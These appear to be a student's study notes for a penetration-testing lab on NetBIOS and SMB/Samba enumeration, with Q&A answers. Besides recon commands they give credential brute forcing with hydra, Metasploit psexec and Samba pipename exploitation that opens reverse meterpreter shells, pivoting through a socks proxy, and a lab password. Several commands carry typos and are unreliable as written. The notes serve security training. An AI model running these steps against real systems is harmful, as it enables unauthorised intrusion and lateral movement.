# NetBIOS & SMB Enumberation

## NetBIOS (Network Basic Input/Output System)

NetBIOS is an API and a set of network protocols for providing communicaation services over a local network. It's used primarily to allow applications on different computers to find and interact with each other on a network

Ports:
137 ---> Name Service
138 ---> Datagram Service
139 ---> Session Service over UDP and TCP

- __1.`nmblookup <ip>`__
- __2.`nbtscan <ip>`__

> Note: Sometimes NetBIOS service runs on UDP so go for -sU in Nmap
  - `nmap -sU -p 137 <ip>`
  - `nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n <ip>` 
# Q&A
- __1.Which tool is commonly used to perform basic NetBIOS enumeration?__
  - __Ans. `nbstat`__

## SMB (Server Message Block)

SMB is a network file sharing protocol that allows computers on a network to share files,printers, and other resources. It is the primary protocol used in Windows networks for these purposes.

Ports:
445 ---> is the direct SMB port.
139 ---> is used for SMB when it's utilizing NetBIOS over TCP/IP.

  - `nmap -sV -p 139,445 demo.ine.local`
  - `nmap -p 445 --script smb-protocols`

- __nmap__
  - __`nmap -p 445 --script smb-enum-users <ip>`__
  - __Save the users in the user.txt for brute force attack__
- __hydra__
  - __`hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip> smb`__
  - __You can use psexec module in metasploit__
- __msfconsole__
  - __`service postgresql start & msfconsole`__
  - __`search psexec`__
  - __`set RHOSTS <target ip>`__
  - __`set SMBUser <username>`__
  - __`set SMBPass <password>`__
  - __`exploit`__
  - > __If you are not getting then switch to x64 bit meterpreter session__
    - __`set payload windows/x64/meterpreter/reverse_tcp
    - __`exploit`__
  - __`sysinfo`__
  - __`shell`__
  - > __make this session in the background__

- __pivoting__
  - __set the autoroute for the target in metasploit__
    - __`run autoroute -s 10.0.1.0/20`__
  - __check the porxchain in the kali__
    - __`cat /etc/proxychains.conf` or `cat /etc/proxychains4a.conf`__
  - __search in msfconsole__
    - __`search socks4`__
    - __`use auxiliary/server/socks_proxy`__
      - __`set VERSION 4a`__
      - __`set SRVPORT 9050`__
      - __`exploit`__
  - __now open kali you can do the nmap__
    - __`proxychains nmap -sV -T4 -O -Pn -p 445 <ip>`__
  - __use the net view in the the reverse shell__
    - __`migrate -N explorer.exe`__
    - __`shell`__
     - __`net view <ip_of_the_subnet>`__
     - __`net use D: \\<subip>\Documents`__

 
# Q&A
- __1.What is the primary purpose of SMB in Windows networks?__
  - __Ans. `To facilitate network file sharing and resource access`__

- __2.Why do modern Windows networks primarily use SMB instead of NetBIOS?__
  - __Ans.`SMB offers better performance and security`__

- __3.Why is SMBv1 considered insecure?__
  - __Ans. `It allows anonymous logons and has several security vulnerabilities`__


# exploiting using metasploit framework
- __`search type:exploit name:samba`__
- __`search pipename`__
```
use exploit/Linux/samba/is_know_pipename
exploit
```
ctr+z
upgrading to meterpreter session
```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST ech1
set session 1
exploit
```




# SMB (Server Message Block) - 445 TCP, 139 on NetBIOS
  - __used for network file sharing, printer__
  - __SAMBA is the open source linux implementation of SMB__
- __1. We will run smb_login module to find all the valid users and their passwords.__
```
service postgresql start && msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit
```
## We have found four valid users and their passwords
- __2.Running psexec module to gain the meterpreter shell..__
```
service postgresql start && msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```



# samba
```
1. Find the OS version of samba server using rpcclient.
Ans. 
`rpcclient -U "" -N 10.0.1.22`
`srvinfo`

2. Find the OS version of samba server using enum4Linux.
Ans. `enum4linux -o 10.0.1.22`

3. Find the server description of samba server using smbclient.
Ans. `smbclient -L 10.0.1.22 -N`


4. Is NT LM 0.12 (SMBv1) dialects supported by the samba server? Use appropriate nmap script.
Ans. `nmap -p445 --script smb-protocols 10.0.1.22`

5. Is SMB2 protocol supported by the samba server? Use smb2 metasploit module.
Ans. 
- `msfconsole`
- `use auxiliary/scanner/smb/smb2
- `set RHOSTS 10.0.1.22`
- `exploit`

6. List all users that exists on the samba server  using appropriate nmap script.
Ans. `nmap --script smb-enum-users -p445 10.0.1.22`

7. List all users that exists on the samba server  using smb_enumusers metasploit modules.
Ans. 
- `msfconsole`
- `use auxiliary/scanner/smb/smb_enumusers
- `set RHOSTS 10.0.1.22`
- `exploit`

8. List all users that exists on the samba server  using enum4Linux.
Ans. enum4linux -U 10.0.1.22

9. List all users that exists on the samba server  using rpcclient.
Ans. rpcclient -U "" -N 10.0.1.22

10. Find SID of user “admin” using rpcclient.



Find the exact version of samba server by using appropriate nmap script.
Ans. nmap --script smb-os-discovery -p445 10.0.1.22

Find the exact version of samba server by using smb_version metasploit module.
Ans.
msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS 10.0.1.22
exploit

What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.
Ans. nmap -script smb-os-discovery p 445 10.0.1.22


Find the NetBIOS computer name of samba server using nmblookup
Ans. nmblookup -A 10.0.1.22

Using smbclient determine whether anonymous connection (null session)  is allowed on the samba server or not.
Ans. smbclient -L 10.0.1.22 -N

Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.
Ans. 
rpcclient -U "" -N 10.0.1.22
getusername


List all available shares on the samba server using Nmap script.
Ans. nmap -p445 --script smb-enum-shares

List all available shares on the samba server using smb_enumshares Metasploit module.
Ans.
msfconsole
use auxiliary/scanner/smb/smb_enumshares
set rhosts 10.0.1.22
exploit

List all available shares on the samba server using enum4Linux.
Ans. enum4linusx -S 10.0.1.22

List all available shares on the samba server using smbclient.
Ans. subclient -L 10.0.1.22 -N

Find domain groups that exist on the samba server by using enum4Linux.
Ans. enum4linux -G 10.0.1.22

Find domain groups that exist on the samba server by using rpcclient.
Ans. 
rpcclient -U "" -N 10.0.1.22
enumdomgroups

Is samba server configured for printing?
Ans.enum4linux -i 10.0.1.22

How many directories are present inside share “public”?
Ans. smbclient //10.0.1.22/public -N






1.What is the NetBIOS computer name of samba server?
Ans. SAMBA-RECON 

2. Find SID of user “admin” using rpcclient?
Ans. S-1-5-21-4056189605-2085045094-1961111545-1005
```





## Samba
###### TCP Scan
`nmap -sV 10.0.1.22` or `nmap -Pn -A -p- -sC -T4 10.0.1.22`
###### UDP Scan
nmap 10.0.1.22 -sU --top-port 25 --open -sV 
#### Metasploit
* To find the smb version we can use metasploit also
- `msfconsole`
- `user auxiliary/scanner/smb/smb_version`
- `show options`
- `set rhosts <target_ip>`
- `run` or `exploit`

### nmblookup

- `nmblookup -A 10.0.1.22`
  - If you get the result `SAMBA-RECON  <20>`
  - That means there is a server running
  - so using `smbclient` we can connect to the server
#### smbclient
- `smbclient -L 10.0.1.22 -N`
- `rpcclient -U "" -N 10.0.1.22`

### Samba 2
- `rpcclient -U "" -N 10.0.1.22`
  - `enumdomusers`
  - `lookupnames admin`
  - `srvinfo`
- `enum4linux -o 10.0.1.22`
- `enum4linux -U 10.0.1.22`
- `smbclient -L 10.0.1.22 -N`
- `msfconsole`
- `use auxiliary/scanner/smb/smb2
- `set RHOSTS 10.0.1.22`
- `exploit`



